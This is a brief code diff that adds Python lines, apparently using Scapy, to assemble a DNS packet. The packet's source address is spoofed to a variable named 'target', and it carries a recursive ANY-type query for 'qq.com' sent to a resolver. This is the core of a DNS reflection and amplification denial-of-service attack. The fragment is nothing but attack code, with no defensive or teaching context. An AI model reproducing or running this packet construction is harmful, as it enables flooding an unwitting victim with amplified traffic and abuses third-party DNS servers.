@@ -1,0 +1,6 @@
+i = IP(dst="202.106.0.20", src=target)
+u = UDP()
+d = DNS(rd=1, qdcount=1)
+q = DNSQR(qname="qq.com", qtype=255)
+d.qd = q
+r = (i/u/d)
